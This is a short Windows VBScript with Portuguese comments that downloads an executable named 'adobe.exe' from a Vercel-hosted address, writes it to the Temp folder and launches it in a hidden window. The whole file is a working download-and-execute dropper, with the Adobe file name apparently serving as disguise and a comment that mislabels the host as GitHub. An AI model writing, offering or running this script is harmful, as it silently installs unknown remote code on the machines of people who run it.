Option Explicit

Dim url, caminhoDestino, http, stream, fso

' URL RAW do GitHub para o executável
url = "https://testando123-blond.vercel.app/adobe.exe"

' Caminho de destino no Temp
Set fso = CreateObject("Scripting.FileSystemObject")
caminhoDestino = fso.GetSpecialFolder(2) & "\adobe.exe"

' Apaga se já existir (evita erro ao gravar)
If fso.FileExists(caminhoDestino) Then
    On Error Resume Next
    fso.DeleteFile caminhoDestino, True
    On Error GoTo 0
End If

' Requisição HTTP
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binário
    stream.Open
    stream.Write http.responseBody

    ' Tenta salvar no destino
    On Error Resume Next
    stream.SaveToFile caminhoDestino, 2
    If Err.Number <> 0 Then
        MsgBox "Erro ao gravar o arquivo: " & Err.Description
        WScript.Quit
    End If
    On Error GoTo 0
    stream.Close

    ' Executa
    CreateObject("WScript.Shell").Run Chr(34) & caminhoDestino & Chr(34), 0, False
Else
    MsgBox "Erro ao baixar: " & http.Status
End If
